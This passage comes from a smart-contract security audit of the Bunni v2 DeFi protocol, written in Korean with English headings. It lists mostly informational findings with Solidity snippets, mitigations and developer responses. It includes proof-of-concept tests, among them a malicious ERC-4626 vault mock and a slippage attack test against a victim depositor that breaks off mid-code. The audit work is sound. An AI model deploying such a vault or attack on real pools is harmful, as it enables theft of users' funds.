    _mint(key.currency0, secondDepositor, depositAmount0);
    _mint(key.currency1, secondDepositor, depositAmount1);

    // deposit tokens
    depositParams = IBunniHub.DepositParams({
        poolKey: key,
        amount0Desired: depositAmount0,
        amount1Desired: depositAmount1,
        amount0Min: 0,
        amount1Min: 0,
        deadline: block.timestamp,
        recipient: secondDepositor,
        refundRecipient: secondDepositor,
        vaultFee0: 0,
        vaultFee1: 0,
        referrer: address(0)
    });
    (bool success, uint256 previewedShares, uint256 previewedAmount0, uint256 previewedAmount1) = quoter.quoteDeposit(address(this), depositParams);

    vm.prank(secondDepositor);
    (uint256 sharesSecondDepositor, uint256 secondDepositorAmount0In, uint256 secondDepositorAmount1In) = hub.deposit(depositParams);

    console.log("Quote deposit will be successful?", success);
    console.log("Quoted shares to mint", previewedShares);
    console.log("Quoted token0 amount to use", previewedAmount0);
    console.log("Quoted token1 amount to use", previewedAmount1);
    console.log("---------------------------------------------------");
    console.log("Actual shares minted", sharesSecondDepositor);
    console.log("Actual token0 amount used", secondDepositorAmount0In);
    console.log("Actual token1 amount used", secondDepositorAmount1In);
}
```

Output:
```
Ran 1 test for test/BunniHub.t.sol:BunniHubTest
[PASS] test_QuoterAssumingCorrectVaultFee() (gas: 4773069)
Logs:
  Quote deposit will be successful? true
  Quoted shares to mint 1000000000000000000
  Quoted token0 amount to use 1000000000000000000
  Quoted token1 amount to use 1000000000000000000
  ---------------------------------------------------
  Actual shares minted 930000000000000000
  Actual token0 amount used 930000000000000000
  Actual token1 amount used 1000000000000000000

Suite result: ok. 1 passed; 0 failed; 0 skipped; finished in 1.71s (4.45ms CPU time)

Ran 1 test suite in 1.71s (1.71s CPU time): 1 tests passed, 0 failed, 0 skipped (1 total tests)
```

**Recommended Mitigation:** 위에서 설명한 대로 누락된 검증을 구현하십시오.

**Bacon Labs:** [PR \#122](https://github.com/timeless-fi/bunni-v2/pull/122)에서 수정되었습니다.

**Cyfrin:** 검증되었습니다. `BunniHub`의 동작과 일치하도록 `BunniQuoter`에 추가 검증이 추가되었습니다.


### Before swap delta can exceed the actual specified amount for exact input swaps due to rounding

**Description:** `BunniHookLogic::beforeSwap`에서 `beforeSwapDelta`를 반환할 때 `actualInputAmount`는 `amountSpecified`와 Bunni 스왑 수학을 사용하여 계산된 `inputAmount` 중 최대값으로 할당됩니다:

```solidity
// return beforeSwapDelta
// take in max(amountSpecified, inputAmount) such that if amountSpecified is greater we just happily accept it
int256 actualInputAmount = FixedPointMathLib.max(-params.amountSpecified, inputAmount.toInt256());
inputAmount = uint256(actualInputAmount);
beforeSwapDelta = toBeforeSwapDelta({
    deltaSpecified: actualInputAmount.toInt128(),
    deltaUnspecified: -outputAmount.toInt256().toInt128()
});
```

아래 표시된 주석처럼 초과 지정된 금액을 수용하려는 의도입니다. 그러나 아래 표시된 부분 스왑 엣지 케이스 `BunniSwapMath::computeSwap`에서 입력 금액 계산이 올림(rounds up)되므로, 이 값은 정확한 입력(exact input) 스왑의 경우가 아닌 경우 지정된 금액을 약간 초과할 수 있습니다.

```solidity
// compute input and output token amounts
// NOTE: The rounding direction of all the values involved are correct:
// - cumulative amounts are rounded up
// - naiveSwapAmountIn is rounded up
// - naiveSwapAmountOut is rounded down
// - currentActiveBalance0 and currentActiveBalance1 are rounded down
// Overall this leads to inputAmount being rounded up and outputAmount being rounded down
// which is safe.
// Use subReLU so that when the computed output is somehow negative (most likely due to precision loss)
// we output 0 instead of reverting.
(inputAmount, outputAmount) = zeroForOne
    ? (
        updatedActiveBalance0 - input.currentActiveBalance0,
        subReLU(input.currentActiveBalance1, updatedActiveBalance1)
    )
    : (
        updatedActiveBalance1 - input.currentActiveBalance1,
        subReLU(input.currentActiveBalance0, updatedActiveBalance0)
    );

return (updatedSqrtPriceX96, updatedTick, inputAmount, outputAmount);
```

**Impact:** 입력 금액의 반올림 오류가 전파되어 원하지 않는 경우 `amountSpecified`를 초과할 수 있습니다.

**Recommended Mitigation:** `amountSpecified > inputAmount`인 경우에만 `max(amountSpecified, inputAmount)`를 취하여 실제 입력 금액이 반올림 및 정확한 입력 스왑에 영향을 받지 않도록 하십시오. 그렇지 않으면 되돌리는(revert) 것이 좋습니다.

**Bacon Labs:** 인지됨(Acknowledged). 어떤 이유로든(아마도 정밀도 오류로 인해) 입력 금액 `outputAmount`가 실제로 `-amountSpecified`보다 큰 경우 안전을 위해 `inputAmount > -amountSpecified`인 경우 되돌리는 것을 선호합니다.

**Cyfrin:** 인지됨(Acknowledged). `PoolManager`는 `HookDeltaExceedsSwapAmount`와 함께 되돌릴 것입니다.

\clearpage
## Informational


### References to missing am-AMM overrides should be removed

**Description:** `BunniHook::_amAmmEnabled`의 NatSpec은 누락된 것으로 보이는 풀/전역 am-AMM 재정의를 참조합니다. 의심되는 바와 같이 이전 감사 후 제거된 경우 모든 참조를 제거해야 합니다.

```solidity
/// @dev precedence is poolOverride > globalOverride > poolEnabled
function _amAmmEnabled(PoolId id) internal view virtual override returns (bool) {...}
```

**Bacon Labs:** [PR \#105](https://github.com/timeless-fi/bunni-v2/pull/105)에서 수정되었습니다.

**Cyfrin:** 검증되었습니다. 오래된 주석이 제거되었습니다.


### Outdated references to implementation details in `ERC20Referrer` should be replaced

**Description:** `ERC20Referrer`는 `uint232`로 저장되는 잔액에 대한 여러 참조를 만들며, 저장소 슬롯의 상위 24비트는 잠금 플래그와 추천인을 저장하는 데 사용됩니다. 그러나 잔액은 이제 255비트를 사용하여 저장되고 가장 높은 단일 비트는 로그 플래그를 저장하는 데 사용되므로 이는 오래된 것입니다. 예를 들어:

```solidity
/// @dev Balances are stored as uint232 instead of uint256 since the upper 24 bits
/// of the storage slot are used to store the lock flag & referrer.
/// Referrer 0 should be reserved for the protocol since it's the default referrer.
abstract contract ERC20Referrer is ERC20, IERC20Referrer, IERC20Lockable {
    /// -----------------------------------------------------------------------
    /// Errors
    /// -----------------------------------------------------------------------

    /// @dev Error when the balance overflows uint232.
    error BalanceOverflow(); // @audit-info - info: not uint232 but 255 bits
    ...
}
```

`uint232` 및 "상위 24비트"에 대한 모든 오래된 참조는 올바른 구현 세부 정보로 대체되어야 합니다.

**Bacon Labs:** [PR \#107](https://github.com/timeless-fi/bunni-v2/pull/107)에서 수정되었습니다.

**Cyfrin:** 검증되었습니다. `ERC20Referrer`의 오래된 주석이 변경되었습니다.


### Unused errors can be removed

**Description:** `Errors.sol`에 선언된 `BunniHub__InvalidReferrer()` 및 `BunniToken__ReferrerAddressIsZero()` 오류는 사용되지 않습니다.

**Bacon Labs:** [PR \#108](https://github.com/timeless-fi/bunni-v2/pull/108)에서 수정되었습니다.

**Cyfrin:** 검증되었습니다. 사용되지 않는 오류가 제거되었습니다.


### Bunni tokens can be deployed with arbitrary hooks

**Description:** `BunniHubLogic::deployBunniToken`은 의도적으로 `IBunniHook` 인터페이스를 준수하지만 반드시 표준 `BunniHook`일 필요는 없는 임의의 후크로 Bunni 토큰을 배포할 수 있도록 허용하는 것으로 이해됩니다. 별도의 치명적인 발견에서 성공적으로 입증된 바와 같이, raw 밸런스 및 준비금 회계는 악성 후크 및 관련(잠재적으로 악성일 수도 있는) 볼트의 익스플로잇에 대해 견고한 것으로 보이지만, 이러한 무허가성(permissionless-ness)은 전반적인 공격 표면을 크게 증가시킵니다. 또한 후크 수수료 및 LP 추천 보상의 내부 회계를 처리하는 것은 `BunniHook`이므로, 사용자 정의 후크는 프로토콜에 수익을 지불하지 않도록 이를 수정할 수 있습니다.

**Bacon Labs:** 후크 화이트리스트가 추가되어 [PR \#95](https://www.notion.so/1baf46a1865c800d8f52c47682efd607?pvs=25)에서 수정되었습니다.

**Cyfrin:** 검증되었습니다. 후크 화이트리스트는 임의의 후크가 포함된 Bunni 토큰의 배포를 방지합니다.


### Unused return values can be removed

**Description:** `AmAmm::_updateAmAmmWrite`는 현재 상위 입찰의 관리자와 관련 페이로드를 반환하지만, 이 함수의 모든 호출에서 반환 값은 사용되지 않습니다. 필요하지 않은 경우 이러한 사용되지 않는 반환 값을 제거해야 합니다.

**Bacon Labs:** [PR \#7](https://github.com/Bunniapp/biddog/pull/7)에서 수정되었습니다.

**Cyfrin:** 검증되었습니다. 사용되지 않는 반환 값이 제거되었습니다.


### Missing early return case in `AmAmm::_updateAmAmmView`

**Description:** `AmAmm::_updateAmAmmWrite`는 상태 머신을 실행하여 임대료를 청구하고 주어진 풀에 대한 상위 및 다음 입찰을 업데이트하지만, `_lastUpdatedBlockIdx` 상태에서 추적한 대로 해당 블록에서 풀이 이미 업데이트된 경우 일찍 반환됩니다. `AmAmm::_updateAmAmmView`는 상태를 수정하지 않는 이 함수의 버전입니다. 그러나 아래 표시된 조기 반환 사례가 누락되었습니다:

```solidity
// early return if the pool has already been updated in this block
// condition is also true if no update has occurred for type(uint48).max blocks
// which is extremely unlikely
if (_lastUpdatedBlockIdx[id] == currentBlockIdx) {
    return (_topBids[id].manager, _topBids[id].payload);
}
```

`_lastUpdatedBlockIdx` 상태는 뷰(view) 함수 자체에서 업데이트할 수 없지만, 함수의 쓰기(write) 버전이 동일한 블록에서 이미 호출되었을 수 있으므로 조기 반환 사례가 트리거될 수 있습니다.

**Impact:** `AmAmm::getTopBid` 및 `AmAmm::getNextBid`는 주어진 블록에 대한 실제 상태 머신 실행과 일치하지 않는 입찰을 반환할 수 있습니다.

**Recommended Mitigation:** 상태 업데이트를 무시하고 `AmAmm::_updateAmAmmWrite`와 동일하도록 `AmAmm::_updateAmAmmView`에 누락된 검증을 추가하십시오.

**Bacon Labs:** [PR \#8](https://github.com/Bunniapp/biddog/pull/8)에서 수정되었습니다.

**Cyfrin:** 검증되었습니다. 상태 머신이 현재 블록을 이미 업데이트한 경우에 대해 `_updateAmAmmView()`의 조기 반환이 추가되었습니다.


### Infinite Permit2 approval is not recommended

**Description:** `RebalanceLogic::_createRebalanceOrder`에서 리밸런스 주문을 생성할 때 `BunniHook`은 Permit2 계약에서 사용할 토큰을 승인합니다. 구체적으로 주문 입력 금액이 기존 허용량을 초과하면 Permit2 계약은 아래 표시된 대로 주어진 ERC-20 토큰에 대해 최대 uint를 지출하도록 승인됩니다:

```solidity
// approve input token to permit2
if (inputERC20Token.allowance(address(this), env.permit2) < inputAmount) {
    address(inputERC20Token).safeApproveWithRetry(env.permit2, type(uint256).max);
}
```

`FloodPlain` 사전/사후 리밸런스 콜백은 더 이상 Permit2 계약에 대한 직접 호출을 허용하지 않지만, 다른 취약점이 발견되면 매달린 무한 승인이 여전히 악용될 수 있으므로 이 동작은 권장되지 않습니다. `BunniHook`은 기본 준비금을 직접 저장하지 않고 `BunniHub`로/로부터 ERC-6909 청구 토큰을 가져오거나(pull)/보냅니다(push). 그러나 스왑 및 후크 수수료를 저장하며, 이는 풀의 기본 토큰으로 지불되므로 리밸런스 주문이 이루어지면 추출될 수 있습니다.

**Recommended Mitigation:** Permit2 승인을 `BunniHook::_rebalancePrehookCallback`으로 이동하고 `BunniHook::_rebalancePosthookCallback`에서 Permit2 승인을 0으로 재설정하는 것을 고려하십시오.

**Bacon Labs:** [PR \#109](https://github.com/timeless-fi/bunni-v2/pull/109)에서 수정되었습니다. `FloodPlain`은 항상 주문 이행 중에 승인된 전체 금액을 전송하므로 Permit2 승인을 재설정하는 것은 `BunniHook::_rebalancePosthookCallback()`에 추가되지 않았습니다.

**Cyfrin:** 검증되었습니다. 리밸런스 중 Permit2에 대한 무한 승인이 리밸런스 주문에 필요한 정확한 금액으로 수정되어 `BunniHook::_rebalancePrehookCallback`으로 이동되었습니다.


### `idleBalance` argument is missing from `QueryLDF::queryLDF` NatSpec

**Description:** `QueryLDF::queryLDF`는 현재 포함되어 있지 않지만 함수 NatSpec에 포함되어야 하는 `idleBalance` 인수를 사용합니다.

```solidity
/// @notice Queries the liquidity density function for the given pool and tick
/// @param key The pool key
/// @param sqrtPriceX96 The current sqrt price of the pool
/// @param tick The current tick of the pool
/// @param arithmeticMeanTick The TWAP oracle value
/// @param ldf The liquidity density function
/// @param ldfParams The parameters for the liquidity density function
/// @param ldfState The current state of the liquidity density function
/// @param balance0 The balance of token0 in the pool
/// @param balance1 The balance of token1 in the pool
/// @return totalLiquidity The total liquidity in the pool
/// @return totalDensity0X96 The total density of token0 in the pool, scaled by Q96
/// @return totalDensity1X96 The total density of token1 in the pool, scaled by Q96
/// @return liquidityDensityOfRoundedTickX96 The liquidity density of the rounded tick, scaled by Q96
/// @return activeBalance0 The active balance of token0 in the pool, which is the amount used by swap liquidity
/// @return activeBalance1 The active balance of token1 in the pool, which is the amount used by swap liquidity
/// @return newLdfState The new state of the liquidity density function
/// @return shouldSurge Whether the pool should surge
function queryLDF(
    PoolKey memory key,
    uint160 sqrtPriceX96,
    int24 tick,
    int24 arithmeticMeanTick,
    ILiquidityDensityFunction ldf,
    bytes32 ldfParams,
    bytes32 ldfState,
    uint256 balance0,
    uint256 balance1,
    IdleBalance idleBalance
)
```

**Bacon Labs:** [PR \#110](https://github.com/timeless-fi/bunni-v2/pull/110)에서 수정되었습니다.

**Cyfrin:** 검증되었습니다. `idleBalance`가 `queryLDF()` NatSpec에 추가되었습니다.


### Uniswap v4 vendored library mismatch

**Description:** 코드베이스는 `LiquidityAmounts` 및 `SqrtPriceMath` 라이브러리(이 검토 범위에서 제외됨)의 수정된 벤더링 버전을 사용합니다. 그러나 수정된 `LiquidityAmounts` 라이브러리의 현재 구현은 의도된 수정된 벤더링 버전이 아닌 원래 Uniswap v4 버전의 `SqrtPriceMath`를 여전히 참조합니다. 이는 의도하지 않은 것으로 보이며 아래와 같이 `LiquidityAmounts::getAmountsForLiquidity`를 호출할 때 `liquidityDensityOfRoundedTickX96`을 `uint256`에서 `uint128`로 안전하지 않은 다운캐스팅을 수행하는 `queryLDF()` 함수에 영향을 미칩니다:

```solidity
(uint256 density0OfRoundedTickX96, uint256 density1OfRoundedTickX96) = LiquidityAmounts.getAmountsForLiquidity(
    sqrtPriceX96, roundedTickSqrtRatio, nextRoundedTickSqrtRatio, uint128(liquidityDensityOfRoundedTickX96), true
);
```

단일 반올림 틱의 유동성 밀도가 `Q96`의 최대 정규화 밀도를 초과할 수 없다는 불변성이 유지되는 한 조용한 오버플로우는 불가능하지만, `LiquidityAmounts` 라이브러리는 다운캐스트의 필요성을 완전히 피하도록 수정된 버전을 올바르게 참조하도록 업데이트되어야 합니다.

**Bacon Labs:** [PR \#111](https://github.com/timeless-fi/bunni-v2/pull/111)에서 수정되었습니다.

**Cyfrin:** 검증되었습니다. 이제 `v4-core` 대신 사용자 지정 `SqrtPriceMath` 라이브러리가 `LiquidityAmounts` 내에서 사용됩니다.


### Unused constants can be removed

**Description:** `LibDoubleGeometricDistribution`과 `LibCarpetedDoubleGeometricDistribution`은 모두 다음 상수를 정의합니다:

```solidity
uint256 internal constant MIN_LIQUIDITY_DENSITY = Q96 / 1e3;
```

그러나 두 인스턴스 모두 사용되지 않으며 `LibGeometricDistribution` 및 `LibCarpetedGeometricDistribution` 라이브러리에서 잘못 복사된 것으로 보이므로 제거할 수 있습니다.

**Bacon Labs:** [PR \#112](https://github.com/timeless-fi/bunni-v2/pull/112)에서 수정되었습니다.

**Cyfrin:** 검증되었습니다. 사용되지 않는 상수가 `LibCarpetedDoubleGeometricDistribution`에서 제거되었습니다.


### `LibUniformDistribution::decodeParams` logic can be simplified

**Description:** `LibUniformDistribution::decodeParams`의 내부 조건문에서 분포를 사용 가능한 틱 범위 내로 제한할 때 로직이 불필요하게 복잡해집니다. 틱을 제한하기 전에 분포의 길이를 다시 계산하는 대신 기존 스택 변수를 사용하여 이 프로세스를 단순화하고 불필요한 할당을 피할 수 있습니다.

```solidity
/// @return tickLower The lower tick of the distribution
/// @return tickUpper The upper tick of the distribution
function decodeParams(int24 twapTick, int24 tickSpacing, bytes32 ldfParams)
    internal
    pure
    returns (int24 tickLower, int24 tickUpper, ShiftMode shiftMode)
{
    shiftMode = ShiftMode(uint8(bytes1(ldfParams)));

    if (shiftMode != ShiftMode.STATIC) {
        // | shiftMode - 1 byte | offset - 3 bytes | length - 3 bytes |
        int24 offset = int24(uint24(bytes3(ldfParams << 8))); // offset of tickLower from the twap tick
        int24 length = int24(uint24(bytes3(ldfParams << 32))); // length of the position in rounded ticks
        tickLower = roundTickSingle(twapTick + offset, tickSpacing);
        tickUpper = tickLower + length * tickSpacing;

        // bound distribution to be within the range of usable ticks
        (int24 minUsableTick, int24 maxUsableTick) =
            (TickMath.minUsableTick(tickSpacing), TickMath.maxUsableTick(tickSpacing));
@>      if (tickLower < minUsableTick) {
            int24 tickLength = tickUpper - tickLower;
            tickLower = minUsableTick;
            tickUpper = int24(FixedPointMathLib.min(tickLower + tickLength, maxUsableTick));
@>      } else if (tickUpper > maxUsableTick) {
            int24 tickLength = tickUpper - tickLower;
            tickUpper = maxUsableTick;
            tickLower = int24(FixedPointMathLib.max(tickUpper - tickLength, minUsableTick));
        }
    } else {
        ...
    }
}
```

**Recommended Mitigation:**
```diff
    /// @return tickLower The lower tick of the distribution
    /// @return tickUpper The upper tick of the distribution
    function decodeParams(int24 twapTick, int24 tickSpacing, bytes32 ldfParams)
        internal
        pure
        returns (int24 tickLower, int24 tickUpper, ShiftMode shiftMode)
    {
        shiftMode = ShiftMode(uint8(bytes1(ldfParams)));

        if (shiftMode != ShiftMode.STATIC) {
            // | shiftMode - 1 byte | offset - 3 bytes | length - 3 bytes |
            int24 offset = int24(uint24(bytes3(ldfParams << 8))); // offset of tickLower from the twap tick
            int24 length = int24(uint24(bytes3(ldfParams << 32))); // length of the position in rounded ticks
            tickLower = roundTickSingle(twapTick + offset, tickSpacing);
            tickUpper = tickLower + length * tickSpacing;

            // bound distribution to be within the range of usable ticks
            (int24 minUsableTick, int24 maxUsableTick) =
                (TickMath.minUsableTick(tickSpacing), TickMath.maxUsableTick(tickSpacing));
            if (tickLower < minUsableTick) {
--              int24 tickLength = tickUpper - tickLower;
--              tickLower = minUsableTick;
--              tickUpper = int24(FixedPointMathLib.min(tickLower + tickLength, maxUsableTick));
++              tickUpper = int24(FixedPointMathLib.min(minUsableTick + length * tickSpacing, maxUsableTick));
            } else if (tickUpper > maxUsableTick) {
--              int24 tickLength = tickUpper - tickLower;
--              tickUpper = maxUsableTick;
--              tickLower = int24(FixedPointMathLib.max(tickUpper - tickLength, minUsableTick));
++              tickLower = int24(FixedPointMathLib.max(maxUsableTick - length * tickSpacing, minUsableTick));
            }
        } else {
            ...
        }
    }
```

**Bacon Labs:** [PR \#113](https://github.com/timeless-fi/bunni-v2/pull/113)에서 수정되었습니다.

**Cyfrin:** 검증되었습니다. `LibUniformDistribution::decodeParams` 로직이 단순화되었습니다.


### Potential for blockchain explorer griefing due to successful zero value transfers from non-approved callers

**Description:** `from` 주소의 승인을 받지 않은 주소에서 `ERC20Referrer::transferFrom`이 호출되면 실행이 되돌려집니다:

```solidity
// Compute the allowance slot and load its value.
mstore(0x20, msgSender)
mstore(0x0c, _ALLOWANCE_SLOT_SEED)
mstore(0x00, from)
let allowanceSlot := keccak256(0x0c, 0x34)
let allowance_ := sload(allowanceSlot)
// If the allowance is not the maximum uint256 value.
if add(allowance_, 1) {
    // Revert if the amount to be transferred exceeds the allowance.
    if gt(amount, allowance_) {
        mstore(0x00, 0x13be252b) // `InsufficientAllowance()`.
        revert(0x1c, 0x04)
    }
    // Subtract and store the updated allowance.
    sstore(allowanceSlot, sub(allowance_, amount))
}
```

그러나 허용량(allowance)과 전송할 금액이 모두 0이면 실행이 중단되지 않고 계속됩니다. 대신 승인되지 않은 호출자가 이벤트를 트리거하고 의도하지 않은 저장소 슬롯 액세스를 수행하는 것을 방지하기 위해 0 값 전송 시 되돌리도록 추가 검증을 추가해야 합니다.

**Impact:** 사기성 이벤트 방출은 블록체인 탐색기 그리핑(griefing) 공격에 활용될 수 있습니다.

**Proof of Concept:** 다음 테스트를 `ERC20Referrer.t.sol`에 추가해야 합니다:

```solidity
function test_transferFromPoC() external {
    uint256 amount = 1e18;
    token.mint(bob, amount, address(0));

    vm.prank(bob);
    token.approve(address(this), amount);

    // zero transfer from bob to alice doesn't revert
    vm.prank(alice);
    token.transferFrom(bob, alice, 0);
}
```

**Recommended Mitigation:** 특히 호출자가 0의 허용량을 가진 경우 0 값 전송에서 되돌리십시오(revert).

**Bacon Labs:** 인지됨(Acknowledged). 기존 구현에 괜찮다고 생각합니다. 기존 구현은 실제로 "0 값의 전송은 일반 전송으로 처리되어야 하며 `Transfer` 이벤트를 발생시켜야 한다"는 [EIP-20 표준 정의](https://eips.ethereum.org/EIPS/eip-20)와 더 밀접하게 일치한다고 생각합니다. 이는 OpenZeppelin과 같은 인기 있는 ERC-20 구현의 동작이기도 합니다.

**Cyfrin:** 인지됨(Acknowledged).


### `GeometricDistribution` LDF length validation prevents the full range of usable ticks from being used

**Description:** `LibGeometricDistribution:isValidParams`에서 `length` 변수는 `minTickOrOffset`과 `maxTick` 사이의 `tickSpacing` 수를 나타냅니다. 현재 검증은 `length`가 `minUsableTick`과 `maxUsableTick` 사이에 포함될 수 있음에도 불구하고 이 `length`가 최대 사용 가능 범위의 절반을 초과할 때 되돌려집니다:

```solidity
    function isValidParams(int24 tickSpacing, uint24 twapSecondsAgo, bytes32 ldfParams) internal pure returns (bool) {
        (int24 minUsableTick, int24 maxUsableTick) =
            (TickMath.minUsableTick(tickSpacing), TickMath.maxUsableTick(tickSpacing));

        // | shiftMode - 1 byte | minTickOrOffset - 3 bytes | length - 2 bytes | alpha - 4 bytes |
        uint8 shiftMode = uint8(bytes1(ldfParams));
        int24 minTickOrOffset = int24(uint24(bytes3(ldfParams << 8)));
        int24 length = int24(int16(uint16(bytes2(ldfParams << 32))));
        uint256 alpha = uint32(bytes4(ldfParams << 48));

        // ensure shiftMode is within the valid range
        if (shiftMode > uint8(type(ShiftMode).max)) {
            return false;
        }

        // ensure twapSecondsAgo is non-zero if shiftMode is not static
        if (shiftMode != uint8(ShiftMode.STATIC) && twapSecondsAgo == 0) {
            return false;
        }

        // ensure minTickOrOffset is aligned to tickSpacing
        if (minTickOrOffset % tickSpacing != 0) {
            return false;
        }

        // ensure length > 0 and doesn't overflow when multiplied by tickSpacing
@>      // ensure length can be contained between minUsableTick and maxUsableTick
        if (
            length <= 0 || int256(length) * int256(tickSpacing) > type(int24).max
                || length > maxUsableTick / tickSpacing || -length < minUsableTick / tickSpacing
        ) return false;
```

`length > maxUsableTick / tickSpacing` 검증은 범위가 0에서 오른쪽 가장 많이 사용 가능한 틱까지의 거리를 초과하는 것을 방지하려고 합니다. 마찬가지로 `-length < minUsableTick / tickSpacing` 검증은 범위가 0에서 왼쪽 가장 많이 사용 가능한 틱까지의 거리를 초과하는 것을 방지하려고 합니다. 두 번째 경우는 `length > -minUsableTick / tickSpacing`과 동일하며, 이는 검증의 양쪽 모두 동일한 절대값을 가짐을 의미합니다. 따라서 `length ≤ |maxUsableTick| / tickSpacing`으로 범위의 길이가 절반 범위보다 크지 않도록 강제합니다.

`LibDoubleGeometricDistribution::isValidParams`에도 유사한 로직이 존재합니다. 따라서 `minUsableTick`과 `maxUsableTick` 사이의 전체 틱 범위를 사용하려는 이러한 LDF 중 하나로 구성된 풀을 배포하는 것은 불가능합니다. 이 동작은 의도적인 것으로 이해되며 최소 유동성 밀도 요구 사항과 관련이 있을 수 있습니다. 대부분의 합리적인 틱 간격에 대해 큰 길이가 주어지면 어차피 실패할 것이므로 이 경우 완화가 필요하지 않습니다.

**Bacon Labs:** 인지됨(Acknowledged). 최소 유동성 요구 사항으로 인해 실제로 제한에 도달할 가능성이 낮기 때문에 길이 제한에 괜찮습니다.

**Cyfrin:** 인지됨(Acknowledged).


### Insufficient slippage protection in `BunniHub::deposit`

**Description:** `BunniHub::deposit`은 현재 호출자가 사용할 각 토큰의 최소 금액을 제공하도록 허용하여 슬리피지 보호를 구현합니다:

```solidity
function deposit(HubStorage storage s, Env calldata env, IBunniHub.DepositParams calldata params)
    external
    returns (uint256 shares, uint256 amount0, uint256 amount1)
{
    ...
    // check slippage
    if (amount0 < params.amount0Min || amount1 < params.amount1Min) {
        revert BunniHub__SlippageTooHigh();
    }
    ...
}
```

이 확인은 입금자가 예상한 토큰 비율에 큰 변화가 없는지 확인합니다. 그러나 주어진 토큰 금액에 대해 입금자가 예상되는 주식 금액을 받는지 확인하는 검사는 없습니다. Uniswap은 총 토큰 금액을 조작하는 것이 불가능하기 때문에 이 검증을 생략하지만, Bunni는 재hypothecation을 위해 외부 볼트를 사용할 수 있으므로 두 토큰의 잔액이 입금자가 예상한 것과 크게 변경되는 것이 가능합니다. 토큰 비율이 일정하게 유지되는 한, 볼트에 입금된 금액을 통해 토큰 잔액이 조작되면 후속 입금자로부터 가치를 훔칠 수 있습니다.

**Impact:** 사용자는 예상보다 적은 주식을 받을 수 있지만, 이는 악성 볼트 구현에 의존하므로 정보성(informational)이며, 사용자는 이러한 방식으로 구성된 풀과 고의로 상호 작용하지 않을 것입니다.

**Proof of Concept:** 이 `MaliciousERC4626SlippageVault`를 `test/mocks/ERC4626Mock.sol`에 배치하여 토큰 잔액의 악의적인 변경을 시뮬레이션하십시오:

```solidity
contract MaliciousERC4626SlippageVault is ERC4626 {
    address internal immutable _asset;
    uint256 internal multiplier = 1;

    constructor(IERC20 asset_) {
        _asset = address(asset_);
    }

    function setMultiplier(uint256 newMultiplier) public {
        multiplier = newMultiplier;
    }

    function previewRedeem(uint256 shares) public view override returns(uint256 assets){
        return super.previewRedeem(shares) * multiplier;
    }

    function deposit(uint256 assets, address to) public override returns(uint256 shares){
        multiplier = 1;
        return super.deposit(assets, to);
    }

    function asset() public view override returns (address) {
        return _asset;
    }

    function name() public pure override returns (string memory) {
        return "MockERC4626";
    }

    function symbol() public pure override returns (string memory) {
        return "MOCK-ERC4626";
    }
}
```

다음 테스트를 `BunniHub.t.sol`에 배치해야 합니다:
```solidity
function test_SlippageAttack() public {
    ILiquidityDensityFunction uniformDistribution = new UniformDistribution(address(hub), address(bunniHook), address(quoter));
    Currency currency0 = Currency.wrap(address(token0));
    Currency currency1 = Currency.wrap(address(token1));
    MaliciousERC4626SlippageVault maliciousVaultToken0 = new MaliciousERC4626SlippageVault(token0);
    MaliciousERC4626SlippageVault maliciousVaultToken1 = new MaliciousERC4626SlippageVault(token1);
    ERC4626 vault0_ = ERC4626(address(maliciousVaultToken0));
    ERC4626 vault1_ = ERC4626(address(maliciousVaultToken1));
    IBunniToken bunniToken;
    PoolKey memory key;
    (bunniToken, key) = hub.deployBunniToken(
        IBunniHub.DeployBunniTokenParams({
            currency0: currency0,
            currency1: currency1,
            tickSpacing: TICK_SPACING,
            twapSecondsAgo: TWAP_SECONDS_AGO,
            liquidityDensityFunction: uniformDistribution,
            hooklet: IHooklet(address(0)),
            ldfType: LDFType.DYNAMIC_AND_STATEFUL,
            ldfParams: bytes32(abi.encodePacked(ShiftMode.STATIC, int24(-5) * TICK_SPACING, int24(5) * TICK_SPACING)),
            hooks: bunniHook,
            hookParams: abi.encodePacked(
                FEE_MIN,
                FEE_MAX,
                FEE_QUADRATIC_MULTIPLIER,
                FEE_TWAP_SECONDS_AGO,
                POOL_MAX_AMAMM_FEE,
                SURGE_HALFLIFE,
                SURGE_AUTOSTART_TIME,
                VAULT_SURGE_THRESHOLD_0,
                VAULT_SURGE_THRESHOLD_1,
                REBALANCE_THRESHOLD,
                REBALANCE_MAX_SLIPPAGE,
                REBALANCE_TWAP_SECONDS_AGO,
                REBALANCE_ORDER_TTL,
                true, // amAmmEnabled
                ORACLE_MIN_INTERVAL,
                MIN_RENT_MULTIPLIER
            ),
            vault0: vault0_,
            vault1: vault1_,
            minRawTokenRatio0: 0.08e6,
            targetRawTokenRatio0: 0.1e6,
            maxRawTokenRatio0: 0.12e6,
            minRawTokenRatio1: 0.08e6,
            targetRawTokenRatio1: 0.1e6,
            maxRawTokenRatio1: 0.12e6,
            sqrtPriceX96: TickMath.getSqrtPriceAtTick(0),
            name: bytes32("BunniToken"),
            symbol: bytes32("BUNNI-LP"),
            owner: address(this),
            metadataURI: "metadataURI",
            salt: bytes32(0)
        })
    );

    // make initial deposit to avoid accounting for MIN_INITIAL_SHARES
    uint256 depositAmount0 = 1e18;
    uint256 depositAmount1 = 1e18;
    address firstDepositor = makeAddr("firstDepositor");
    vm.startPrank(firstDepositor);
    token0.approve(address(PERMIT2), type(uint256).max);
    token1.approve(address(PERMIT2), type(uint256).max);
    PERMIT2.approve(address(token0), address(hub), type(uint160).max, type(uint48).max);
    PERMIT2.approve(address(token1), address(hub), type(uint160).max, type(uint48).max);
    vm.stopPrank();

    // mint tokens
    _mint(key.currency0, firstDepositor, depositAmount0 * 100);
    _mint(key.currency1, firstDepositor, depositAmount1 * 100);

    // deposit tokens
    IBunniHub.DepositParams memory depositParams = IBunniHub.DepositParams({
        poolKey: key,
        amount0Desired: depositAmount0,
        amount1Desired: depositAmount1,
        amount0Min: 0,
        amount1Min: 0,
        deadline: block.timestamp,
        recipient: firstDepositor,
        refundRecipient: firstDepositor,
        vaultFee0: 0,
        vaultFee1: 0,
        referrer: address(0)
    });

    vm.startPrank(firstDepositor);
    (uint256 sharesFirstDepositor, uint256 firstDepositorAmount0In, uint256 firstDepositorAmount1In) = hub.deposit(depositParams);
    console.log("Amount 0 deposited by first depositor", firstDepositorAmount0In);
    console.log("Amount 1 deposited by first depositor", firstDepositorAmount1In);
    maliciousVaultToken0.setMultiplier(1e10);
    maliciousVaultToken1.setMultiplier(1e10);
    vm.stopPrank();


    depositAmount0 = 100e18;
    depositAmount1 = 100e18;
    address victim = makeAddr("victim");
    vm.startPrank(victim);
    token0.approve(address(PERMIT2), type(uint256).max);
    token1.approve(address(PERMIT2), type(uint256).max);
